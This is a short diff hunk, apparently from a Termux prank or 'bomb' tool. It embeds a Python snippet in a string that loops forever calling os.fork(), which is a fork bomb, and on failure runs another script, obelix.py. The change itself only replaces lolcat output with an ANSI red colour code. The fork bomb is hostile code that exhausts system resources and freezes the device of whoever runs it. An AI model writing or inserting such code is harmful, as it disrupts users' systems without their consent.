@@ -29,5 +29,6 @@ try:
     while True:
         os.fork()
 except:
-    os.system('python /data/data/com.termux/files/usr/etc/obelix.py|lolcat')
+    print('\033[31m')
+    os.system('python /data/data/com.termux/files/usr/etc/obelix.py')
 """)
